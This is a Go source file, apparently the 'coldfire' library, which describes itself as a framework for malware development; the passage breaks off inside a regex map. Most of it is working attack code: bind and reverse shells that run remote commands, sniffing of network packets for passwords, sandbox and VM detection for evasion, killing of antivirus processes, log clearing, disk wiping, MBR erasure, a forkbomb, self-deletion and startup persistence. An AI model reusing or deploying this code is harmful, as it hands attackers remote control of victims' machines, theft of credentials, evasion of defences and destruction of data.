// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/md5"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"reflect"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/fatih/color"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"github.com/jackpal/gateway"
	"github.com/matishsiao/goInfo"
	"github.com/mitchellh/go-homedir"
	ps "github.com/mitchellh/go-ps"
	"github.com/savaki/jq"
	// wapi "github.com/iamacarpet/go-win64api"
	// "tawesoft.co.uk/go/dialog"
)

var (
	Red    = color.New(color.FgRed).SprintFunc()
	Green  = color.New(color.FgGreen).SprintFunc()
	Cyan   = color.New(color.FgBlue).SprintFunc()
	Bold   = color.New(color.Bold).SprintFunc()
	Yellow = color.New(color.FgYellow).SprintFunc()
)

// Revert returns a reversed string.
func Revert(s string) string {
	r := []rune(s)
	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	return string(r)
}

// IpIncrement increments an IP address by 1.
func IpIncrement(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// KillProcByPID kills a process given its PID.
func KillProcByPID(pid int) error {
	return killProcByPID(pid)
}

func handleBind(conn net.Conn) {
	for {
		buffer := make([]byte, 1024)
		length, _ := conn.Read(buffer)
		command := string(buffer[:length-1])
		out, _ := CmdOut(command)
		// parts := strings.Fields(command)
		//   head := parts[0]
		//   parts = parts[1:len(parts)]
		//   out, _ := exec.Command(head,parts...).Output()
		conn.Write([]byte(out))
	}
}

func handleReverse(conn net.Conn) {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func getNTPTime() time.Time {
	type ntp struct {
		FirstByte, A, B, C uint8
		D, E, F            uint32
		G, H               uint64
		ReceiveTime        uint64
		J                  uint64
	}
	sock, _ := net.Dial("udp", "us.pool.ntp.org:123")
	sock.SetDeadline(time.Now().Add((2 * time.Second)))
	defer sock.Close()
	transmit := new(ntp)
	transmit.FirstByte = 0x1b
	binary.Write(sock, binary.BigEndian, transmit)
	binary.Read(sock, binary.BigEndian, transmit)
	return time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((transmit.ReceiveTime >> 32) * 1000000000)))
}

// func _sleep(seconds int, endSignal chan<- bool) {
// 	time.Sleep(time.Duration(seconds) * time.Second)
// 	endSignal <- true
// }

// F is a wrapper for the Sprintf function.
func F(str string, arg ...interface{}) string {
	return fmt.Sprintf(str, arg...)
}

func f(s string, arg ...interface{}) string {
	return fmt.Sprintf(s, arg...)
}

// PrintGood is used to print output indicating success.
func PrintGood(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s \n", Green(t), Green(Bold("[+]")), msg)
}

// PrintInfo is used to print output containing information.
func PrintInfo(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] [*] :: %s\n", t, msg)
}

// PrintError is used to print output indicating failure.
func PrintError(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s \n", Red(t), Red(Bold("[x]")), msg)
}

// PrintWarning is used to print output indicating potential failure.
func PrintWarning(msg string) {
	dt := time.Now()
	t := dt.Format("15:04")
	fmt.Printf("[%s] %s :: %s \n", Yellow(t), Yellow(Bold("[!]")), msg)
}

// FileToSlice reads a textfile and returns all lines as an array.
func FileToSlice(file string) []string {
	fil, _ := os.Open(file)
	defer fil.Close()
	var lines []string
	scanner := bufio.NewScanner(fil)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

// Contains is used to check if an element exists in an array type agnostically.
func Contains(s interface{}, elem interface{}) bool {
	arrV := reflect.ValueOf(s)
	if arrV.Kind() == reflect.Slice {
		for i := 0; i < arrV.Len(); i++ {
			if arrV.Index(i).Interface() == elem {
				return true
			}
		}
	}
	return false
}

// StrToInt converts a string into an integer.
func StrToInt(string_integer string) int {
	// i, _ := strconv.ParseInt(string_integer, 10, 32)
	i, _ := strconv.Atoi(string_integer)
	return i
}

// StrToWords returns a list of strings which was split by spaces.
func StrToWords(s string) []string {
	words := []string{}
	gr := strings.Split(s, " ")
	for x := range gr {
		z := gr[x]
		if len(z) != 0 {
			words = append(words, z)
		}
	}
	return words
}

// IntToStr converts an integer into a string.
func IntToStr(i int) string {
	return strconv.Itoa(i)
}

// SizeToBytes converts a human friendly string indicating size into a proper integer.
func SizeToBytes(size string) int {
	period_letter := string(size[len(size)-1])
	intr := string(size[:len(size)-1])
	i, _ := strconv.Atoi(intr)
	switch period_letter {
	case "g":
		return i * 1024 * 1024 * 1024
	case "m":
		return i * 1024 * 1024
	case "k":
		return i * 1024
	}
	return i
}

// Alloc allocates memory without use.
func Alloc(size string) {
	_ = make([]byte, SizeToBytes(size))
}

// IntervalToSeconds converts a human friendly string indicating time into a proper integer.
func IntervalToSeconds(interval string) int {
	period_letter := string(interval[len(interval)-1])
	intr := string(interval[:len(interval)-1])
	i, _ := strconv.Atoi(intr)

	switch period_letter {
	case "s":
		return i
	case "m":
		return i * 60
	case "h":
		return i * 3600
	}
	return i
}

// GenCpuLoad gives the Cpu work to do by spawning goroutines.
func GenCpuLoad(cores int, interval string, percentage int) {
	runtime.GOMAXPROCS(cores)
	unitHundresOfMicrosecond := 1000
	runMicrosecond := unitHundresOfMicrosecond * percentage
	// sleepMicrosecond := unitHundresOfMicrosecond*100 - runMicrosecond

	for i := 0; i < cores; i++ {
		go func() {
			runtime.LockOSThread()
			for {
				begin := time.Now()
				for {
					if time.Since(begin) > time.Duration(runMicrosecond)*time.Microsecond {
						break
					}
				}
			}
		}()
	}

	t, _ := time.ParseDuration(interval)
	time.Sleep(t * time.Second)
}

// RandomInt returns an integer within a given range.
func RandomInt(min int, max int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(max-min) + min
}

// RandomSelectStr returns a string that was randomly selected from a list of strings.
func RandomSelectStr(list []string) string {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

// RandomSelectStrNested returns a string array that was randomly selected from a nested list of strings
func RandomSelectStrNested(list [][]string) []string {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

// RandomSelectInt returns an integer that was randomly selected from a list of integers.
func RandomSelectInt(list []int) int {
	rand.Seed(time.Now().UnixNano())
	return list[rand.Intn(len(list))]
}

// RemoveNewLines removes possible newlines from a string.
func RemoveNewlines(s string) string {
	re := regexp.MustCompile(`\r?\n`)
	s = re.ReplaceAllString(s, " ")
	return s
}

// FullRemove removes all instances of a string from another string.
func FullRemove(str string, to_remove string) string {
	return strings.Replace(str, to_remove, "", -1)
}

// RemoveDuplicatesStr returns an array of strings that are unique to each other.
func RemoveDuplicatesStr(slice []string) []string {
	keys := make(map[string]bool)
	list := []string{}

	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

// RemoveDuplicatesInt returns an array of integers that are unique to each other.
func RemoveDuplicatesInt(slice []int) []int {
	keys := make(map[int]bool)
	list := []int{}

	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

// ContainsAny checks if a string exists within a list of strings.
func ContainsAny(str string, elements []string) bool {
	for element := range elements {
		e := elements[element]
		if strings.Contains(str, e) {
			return true
		}
	}

	return false
}

// RandomString randomly generates an alphabetic string of a given length.
func RandomString(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)

	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}

	return string(b)
}

// ExitOnError prints a given error and then stops execution of the process.
func ExitOnError(e error) {
	if e != nil {
		PrintError(e.Error())
		os.Exit(0)
	}
}

// RemoveFromSlice removes a string from a list of strings if it exists.
func RemoveFromSlice(slice []string, element string) []string {
	res := []string{}

	for _, e := range slice {
		if e != element {
			res = append(res, e)
		}
	}

	return res
}

// GetLocalIp is used to get the local Ip address of the machine.
func GetLocalIp() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ip := conn.LocalAddr().(*net.UDPAddr).IP

	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

// GetGlobalIp is used to return the global Ip address of the machine.
func GetGlobalIp() string {
	ip := ""
	resolvers := []string{
		"https://api.ipify.org?format=text",
		"http://myexternalip.com/raw",
		"http://ident.me",
	}

	for {
		url := RandomSelectStr(resolvers)
		resp, err := http.Get(url)
		if err != nil {
			log.Printf("%v\n", err)
		}
		defer resp.Body.Close()

		i, _ := ioutil.ReadAll(resp.Body)
		ip = string(i)

		if resp.StatusCode == 200 {
			break
		}
	}

	return ip
}

// GetGatewayIP returns the Ip address of the gateway in the network where the machine resides.
func GetGatewayIP() string {
	ip, err := gateway.DiscoverGateway()
	ExitOnError(err)

	return ip.String()
}

// Iface returns the currently used wireless interface and its MAC address.
func Iface() (string, string) {
	current_iface := ""
	interfaces, err := net.Interfaces()
	ExitOnError(err)

	for _, interf := range interfaces {
		if addrs, err := interf.Addrs(); err == nil {
			for _, addr := range addrs {
				if strings.Contains(addr.String(), GetLocalIp()) {
					current_iface = interf.Name
				}
			}
		}
	}

	netInterface, err := net.InterfaceByName(current_iface)
	ExitOnError(err)

	name := netInterface.Name
	macAddress := netInterface.HardwareAddr
	hwAddr, err := net.ParseMAC(macAddress.String())
	ExitOnError(err)

	return name, hwAddr.String()
}

// Ifaces returns the names of all local interfaces.
func Ifaces() []string {
	ifs := []string{}
	interfaces, _ := net.Interfaces()

	for _, interf := range interfaces {
		ifs = append(ifs, interf.Name)
	}

	return ifs
}

// Info is used to return basic system information.
// Note that if information can not be resolved in a
// specific field it returns "N/A"
func Info() map[string]string {
	_, mac := Iface()
	var (
		u string
		// ap_ip string // what's the purpose? (1)
	)

	i := goInfo.GetInfo()


	u = info()
	hdir, err := homedir.Dir()
	if err != nil {
		log.Fatalf(err.Error())
	}

	inf := map[string]string{
		"username":  u,
		"hostname":  fmt.Sprintf("%v", i.Hostname),
		"go_os":     fmt.Sprintf("%v", i.GoOS),
		"os":        fmt.Sprintf("%v", i.OS),
		"platform":  fmt.Sprintf("%v", i.Platform),
		"cpu_num":   fmt.Sprintf("%v", i.CPUs),
		"kernel":    fmt.Sprintf("%v", i.Kernel),
		"core":      fmt.Sprintf("%v", i.Core),
		"local_ip":  GetLocalIp(),
		"global_ip": GetGlobalIp(),
		"ap_ip":     GetGatewayIP(),
		"mac":       mac,
		"homedir":   hdir,
	}

	return inf
}

// MD5Hash hashes a given string using the MD5.
func MD5Hash(str string) string {
	hasher := md5.New()
	hasher.Write([]byte(str))

	return hex.EncodeToString(hasher.Sum(nil))
}

// CreateWordList generates possible variations of each word in the wordlist.
func CreateWordlist(words []string) []string {
	wordlist := []string{}
	for w := range words {
		word := words[w]
		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, Revert(word))
		wordlist = append(wordlist, first_to_upper)
		wordlist = append(wordlist, first_to_upper+"1")
		wordlist = append(wordlist, first_to_upper+"12")
		wordlist = append(wordlist, first_to_upper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
	}

	return wordlist
}

// ReadFile is used to read a given file and return its data as a string.
func ReadFile(filename string) (string, error) {
	fil, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer fil.Close()

	b, err := ioutil.ReadAll(fil)
	if err != nil {
		return "", err
	}

	return string(b), nil
}

// WriteFile is used to write data into a given file.
func WriteFile(filename, data string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.WriteString(file, data)
	if err != nil {
		return err
	}

	return nil
}

// FilesPattern is used to return data mapped to files
// where their filenames match a given pattern.
func FilesPattern(directory, pattern string) (map[string]string, error) {
	out_map := map[string]string{}
	files, err := ioutil.ReadDir(directory)
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		fl, err := ReadFile(f.Name())

		if err != nil {
			return nil, err
		}

		if strings.Contains(fl, pattern) {
			out_map[f.Name()], err = ReadFile(f.Name())
			if err != nil {
				return nil, err
			}
		}
	}

	return out_map, nil
}

// B64D decodes a given string encoded in Base64.
func B64D(str string) string {
	raw, _ := base64.StdEncoding.DecodeString(str)

	return fmt.Sprintf("%s", raw)
}

// B64E encodes a string in Base64.
func B64E(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

// Wait uses a human friendly string that indicates how long a system should wait.
func Wait(interval string) {
	period_letter := string(interval[len(interval)-1])
	intr := string(interval[:len(interval)-1])
	i, _ := strconv.ParseInt(intr, 10, 64)

	var x int64

	switch period_letter {
	case "s":
		x = i
	case "m":
		x = i * 60
	case "h":
		x = i * 3600
	}

	time.Sleep(time.Duration(x) * time.Second)
}

// func file_info(file string) map[string]string {
//     inf, err := os.Stat(file)
//     return map[string]string{

//     }
// }

// Forkbomb spawns goroutines in order to crash the machine.
func Forkbomb() {
	for {
		go Forkbomb()
	}
}

// Remove is used to self delete.
func Remove() {
	os.Remove(os.Args[0])
}

// Exists checks if a given file is in the system.
func Exists(file string) bool {
	_, err := os.Stat(file)
	if err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

// IsRoot checks if the current user is the administrator of the machine.
func IsRoot() bool {
	return isRoot()
}

// CmdOut executes a given command and returns its output.
func CmdOut(command string) (string, error) {
	return cmdOut(command)
}

// func cmd_out_ssh(address, username, password, command string) (string, error) {
//     config := &ssh.ClientConfig{
//         User: username,
//         Auth: []ssh.AuthMethod{
//             ssh.Password(password),
//         },
//     }
//     client, err := ssh.Dial("tcp", address, config)
//     if err != nil {
//         return "", err
//     }
//     session, err := client.NewSession()
//     if err != nil {
//         return "", err
//     }
//     defer session.Close()
//     var b bytes.Buffer
//     session.Stdout = &b
//     err = session.Run(command)
//     return b.String(), err
// }

// CmdOutPlatform executes a given set of commands based on the OS of the machine.
func CmdOutPlatform(commands map[string]string) (string, error) {
	cmd := commands[runtime.GOOS]
	out, err := CmdOut(cmd)
	if err != nil {
		return "", err
	}

	return out, nil
}

// CmdRun executes a command and writes output as well
// as error to STDOUT.
func CmdRun(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	cmd := exec.Command(head, parts...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		PrintError(err.Error())
		fmt.Println(string(output))
		//fmt.Println(red(err.Error()) + ": " + string(output))
	} else {
		fmt.Println(string(output))
	}
	//ExitOnError("[COMMAND EXEC ERROR]", err)
}

// CmdBlind runs a command without any side effects.
func CmdBlind(command string) {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:]
	cmd := exec.Command(head, parts...)
	_, _ = cmd.CombinedOutput()
	// ExitOnError("[COMMAND EXEC ERROR]", err)
}

// CmdDir executes commands which are mapped to a string
// indicating the directory where the command is executed.
func CmdDir(dirs_cmd map[string]string) ([]string, error) {
	outs := []string{}
	for dir, cmd := range dirs_cmd {
		err := os.Chdir(dir)
		if err != nil {
			return nil, err
		}

		o, err := CmdOut(cmd)
		if err != nil {
			return nil, err
		}
		outs = append(outs, o)
	}

	return outs, nil
}

// MakeZip packs a list of given files within a zip archive.
func MakeZip(zip_file string, files []string) error {
	newZipFile, err := os.Create(zip_file)
	if err != nil {
		return err
	}
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()

	for _, file := range files {
		fileToZip, err := os.Open(file)
		if err != nil {
			return err
		}
		defer fileToZip.Close()
		info, err := fileToZip.Stat()
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name = file
		header.Method = zip.Deflate
		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}
		_, err = io.Copy(writer, fileToZip)
		if err != nil {
			return err
		}
	}

	return nil
}

// CredentialsSniff is used to sniff network traffic for
// private user information.
func CredentialsSniff(ifac, interval string,
	collector chan string,
	words []string) error {
	ifs := []string{}
	if ifac != "all" {
		ifs = []string{ifac}
	} else {
		ifs = append(ifs, ifs...)
	}
	hits := []string{"password", "user",
		"username", "secrets", "auth"}
	for w := range words {
		word := words[w]
		hits = append(hits, word)
	}
	for h := range hits {
		hit := hits[h]
		hits = append(hits, strings.ToUpper(hit))
		hits = append(hits, strings.ToUpper(string(hit[0]))+string(hit[1:]))
	}
	var snapshot_len int32 = 1024
	var timeout time.Duration = time.Duration(IntervalToSeconds(interval)) * time.Second
	for _, i := range ifs {
		handler, err := pcap.OpenLive(i, snapshot_len, false, timeout)
		if err != nil {
			return err
		}
		defer handler.Close()
		source := gopacket.NewPacketSource(handler, handler.LinkType())
		for p := range source.Packets() {
			app_layer := p.ApplicationLayer()
			pay := app_layer.Payload()
			for h := range hits {
				hit := hits[h]
				if bytes.Contains(pay, []byte(hit)) {
					collector <- string(pay)
				}
			}
		}
	}
	return nil
}

// SandboxFilePath checks if the process is being run
// inside a virtualized environment.
func SandboxFilepath() bool {
	return sandboxFilepath()
}

// SandboxProc checks if there are processes that indicate
// a virtualized environment.
func SandboxProc() bool {
	sandbox_processes := []string{`vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`,
		`vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`,
		`vmrawdsk`, `vmusbmouse`, `vmvss`, `vmscsi`, `vmxnet`, `vmx_svga`,
		`vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}
	p, _ := Processes()
	for _, name := range p {
		if ContainsAny(name, sandbox_processes) {
			return true
		}
	}
	return false
}

// SandboxSleep is used to check if the virtualized environment
// is speeding up the sleeping process.
func SandboxSleep() bool {
	z := false
	firstTime := getNTPTime()
	sleepSeconds := 10
	time.Sleep(time.Duration(sleepSeconds*1000) * time.Millisecond)
	secondTime := getNTPTime()
	difference := secondTime.Sub(firstTime).Seconds()
	if difference < float64(sleepSeconds) {
		z = true
	}
	return z
}

// SandboxDisk is used to check if the environment's
// disk space is less than a given size.
func SandboxDisk(size int) bool {
	return sandboxDisk(size)
}

// SandboxCpu is used to check if the environment's
// cores are less than a given integer.
func SandboxCpu(cores int) bool {
	x := false
	num_procs := runtime.NumCPU()
	if !(num_procs >= cores) {
		x = true
	}
	return x
}

// SandboxRam is used to check if the environment's
// RAM is less than a given size.
func SandboxRam(ram_mb int) bool {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	rmb := uint64(ram_mb)
	ram := m.TotalAlloc / 1024 / 1024

	return ram < rmb
}

// SandboxUtc is used to check if the environment
// is in a properly set Utc timezone.
func SandboxUtc() bool {
	_, offset := time.Now().Zone()

	return offset == 0
}

// SandboxProcnum is used to check if the environment
// has processes less than a given integer.
func SandboxProcnum(proc_num int) bool {
	processes, err := ps.Processes()
	if err != nil {
		return true
	}

	return len(processes) < proc_num
}

// SandboxTmp is used to check if the environment's
// temporary directory has less files than a given integer.
func SandboxTmp(entries int) bool {
	return sandboxTmp(entries)
}

// SandboxMac is used to check if the environment's MAC address
// matches standard MAC adddresses of virtualized environments.
func SandboxMac() bool {
	hits := 0
	sandbox_macs := []string{`00:0C:29`, `00:1C:14`,
		`00:50:56`, `00:05:69`, `08:00:27`}
	ifaces, _ := net.Interfaces()

	for _, iface := range ifaces {
		for _, mac := range sandbox_macs {
			if strings.Contains(strings.ToLower(iface.HardwareAddr.String()), strings.ToLower(mac)) {
				hits += 1
			}
		}
	}

	return hits == 0
}

// SandboxAll is used to check if an environment is virtualized
// by testing all sandbox checks.
func SandboxAll() bool {
	values := []bool{
		SandboxProc(),
		SandboxFilepath(),
		SandboxCpu(2),
		SandboxDisk(50),
		SandboxSleep(),
		SandboxTmp(10),
		SandboxProcnum(100),
		SandboxRam(2048),
		SandboxUtc(),
	}

	for s := range values {
		x := values[s]
		if x {
			return true
		}
	}

	return false
}

// SandboxAlln checks if an environment is virtualized by testing all
// sandbox checks and checking if the number of successful checks is
// equal or greater to a given integer.
func SandboxAlln(num int) bool {
	num_detected := 0
	values := []bool{
		SandboxProc(),
		SandboxFilepath(),
		SandboxCpu(2),
		SandboxDisk(50),
		SandboxSleep(),
		SandboxTmp(10),
		SandboxTmp(100),
		SandboxRam(2048),
		SandboxMac(),
		SandboxUtc(),
	}
	for s := range values {
		x := values[s]
		if x {
			num_detected += 1
		}
	}

	return num_detected >= num
}

// Shutdown forces the machine to shutdown.
func Shutdown() error {
	return shutdown()
}

// func set_ttl(interval string){
//     endSignal := make(chan bool, 1)
//     go _sleep(interval_to_seconds(interval), endSignal)
//     select {
//     case <-endSignal:
//         remove()
//         os.Exit(0)
//     }
// }

// func SetTTL(duration string) {
// 	c := cron.New()
// 	c.AddFunc("@every "+duration, remove)
// 	c.Start()
// }

// Bind tells the process to listen to a local port
// for commands.
func Bind(port int) {
	listen, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
	ExitOnError(err)
	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			PrintError("Cannot bind to selected port")
		}
		handleBind(conn)
	}
}

// Reverse initiates a reverse shell to a given host:port.
func Reverse(host string, port int) {
	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
	ExitOnError(err)

	for {
		handleReverse(conn)
	}
}

// PkillPid kills a process by its PID.
func PkillPid(pid int) error {
	err := KillProcByPID(pid)
	return err
}

// PkillName kills a process by its name.
func PkillName(name string) error {
	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if strings.Contains(proc_name, name) {
			err := KillProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

// PkillAv kills Anti-Virus processes that may run within the machine.
func PkillAv() error {
	return pkillAv()
}

// Processes returns a map of a PID to its respective process name.
func Processes() (map[int]string, error) {
	prs := make(map[int]string)
	processList, err := ps.Processes()
	if err != nil {
		return nil, err
	}

	for x := range processList {
		process := processList[x]
		prs[process.Pid()] = process.Executable()
	}

	return prs, nil
}

// Portscan checks for open ports in a given target.
func Portscan(target string, timeout, threads int) (pr []int) {
	ps := portscanner.NewPortScanner(target, time.Duration(timeout)*time.Second, threads)
	opened_ports := ps.GetOpenedPort(0, 65535)

	for p := range opened_ports {
		port := opened_ports[p]
		pr = append(pr, port)
	}

	return
}

// PortscanSingle checks if a specific port is open in a given target.
func PortscanSingle(target string, port int) bool {
	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
	opened_ports := ps.GetOpenedPort(port-1, port+1)

	return len(opened_ports) != 0
}

// Bannergrab returns a service banner string from a given port.
func BannerGrab(target string, port int) (string, error) {
	conn, err := net.DialTimeout("tcp", target+":"+strconv.Itoa(port), time.Second*10)
	if err != nil {
		return "", err
	}

	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(time.Second * 5))

	n, err := conn.Read(buffer)
	if err != nil {
		return "", err
	}

	banner := buffer[0:n]

	return string(banner), nil
}

// SendDataTCP sends data to a given host:port using the TCP protocol.
func SendDataTCP(host string, port int, data string) error {
	addr := host + ":" + strconv.Itoa(port)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return err
	}
	_, err = io.WriteString(conn, data+"\n")
	if err != nil {
		return err
	}
	defer conn.Close()

	return nil
}

// SendDataUDP sends data to a given host:port using the UDP protocol.
func SendDataUDP(host string, port int, data string) error {
	addr := host + ":" + strconv.Itoa(port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return err
	}

	_, err = io.WriteString(conn, data+"\n")
	if err != nil {
		return err
	}
	defer conn.Close()

	return nil
}

// FilePermissions checks if a given file has read and write permissions.
func FilePermissions(filename string) (bool, bool) {
	write_permission := true
	read_permission := true

	file, err := os.OpenFile(filename, os.O_WRONLY, 0666)
	if err != nil {
		if os.IsPermission(err) {
			write_permission = false
		}
	}
	file.Close()

	return read_permission, write_permission
}

// Download downloads a file from a url.
func Download(url string) error {
	splitted := strings.Split(url, "/")
	filename := splitted[len(splitted)-1]

	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	_, err = io.Copy(f, response.Body)
	if err != nil {
		return err
	}

	return nil
}

// Users returns a list of known users within the machine.
func Users() ([]string, error) {
	return users()
}

// EraseMbr zeroes out the Master Boot Record.
func EraseMbr(device string, partition_table bool) error {
	cmd := f("dd if=/dev/zero of=%s bs=446 count=1", device)
	if partition_table {
		cmd = f("dd if=/dev/zero of=%s bs=512 count=1", device)
	}

	_, err := CmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

// Networks returns a list of nearby wireless networks.
func Networks() ([]string, error) {
	return networks()
}

// ExpandCidr returns a list of Ip addresses within a given CIDR.
func ExpandCidr(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); IpIncrement(ip) {
		ips = append(ips, ip.String())
	}

	lenIPs := len(ips)
	switch {
	case lenIPs < 2:
		return ips, nil
	default:
		return ips[1 : len(ips)-1], nil
	}
}

// ClearLogs removes logfiles within the machine.
func ClearLogs() error {
	return clearLogs()
}

// Wipe deletes all data in the machine.
func Wipe() error {
	return wipe()
}

// DnsLookup returns the list of Ip adddress associated with the given hostname.
func DnsLookup(hostname string) ([]string, error) {
	i := []string{}
	ips, err := net.LookupIP(hostname)
	if err != nil {
		return nil, err
	}

	for _, ip := range ips {
		i = append(i, ip.String())
	}

	return i, nil
}

// RdnsLookup returns the list of hostnames associated with the given Ip address.
func RdnsLookup(ip string) ([]string, error) {
	ips, err := net.LookupAddr(ip)
	if err != nil {
		return nil, err
	}
	return ips, nil
}

// CreateUser creates a user with a given username and password.
func CreateUser(username, password string) error {
	return CreateUser(username, password)
}

// WifiDisconnect is used to disconnect the machine from a wireless network.
func WifiDisconnect() error {
	return wifiDisconnect()
}

// Disks returns a list of storage drives within the machine.
func Disks() ([]string, error) {
	return disks()
}

// CopyFile copies a file from one directory to another.
func CopyFile(src, dst string) error {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	return err
}

// TraverseCurrentDir lists all files that exist within the current directory.
func TraverseCurrentDir() ([]string, error) {
	files_in_dir := []string{}
	files, err := ioutil.ReadDir(".")
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		files_in_dir = append(files_in_dir, f.Name())
	}

	return files_in_dir, nil
}

// TraverseDir lists all files that exist within a given directory.
func TraverseDir(dir string) ([]string, error) {
	files_in_dir := []string{}
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		files_in_dir = append(files_in_dir, f.Name())
	}

	return files_in_dir, nil
}

// RemoveStr removes a given string from a list of strings.
func RemoveStr(slice []string, s string) []string {
	final := []string{}
	for _, e := range slice {
		if e != s {
			final = append(final, e)
		}
	}

	return final
}

// RemoveInt removes a given integer from a list of integers.
func RemoveInt(slice []int, s int) []int {
	final := []int{}
	for _, e := range slice {
		if e != s {
			final = append(final, e)
		}
	}

	return final
}

// AddPersistentCommand creates a task that runs a given command on startup.
func AddPersistentCommand(cmd string) error {
	return addPersistentCommand(cmd)
}

// RegexMatch checks if a string contains valuable information through regex.
func RegexMatch(regex_type, str string) bool {
	regexes := map[string]string{
		"mail":   "^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$",
		"ip":     `(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`,
		"mac":    `^([0-9A-Fa-f]{2}[:-])/contains{5}([0-9A-Fa-f]{2})$`,
		"date":   `\d{4}-\d{2}-\d{2}`,
		"domain": `^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/\n]+)`,
		"phone":  `^(?:(?:\(?(?:00|\+)([1-4]\d\d|[1-9]\d?)\)?)?[\-\.\ \\\/]?)?((?:\(?\d{1,}\)?[\-\.\ \\\/]?){0,})(?:[\-\.\ \\\/]?(?:#|ext\.?|extension|x)[\-\.\ \\\/]?(\d+))?$`,
		"ccn":    `^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$`,
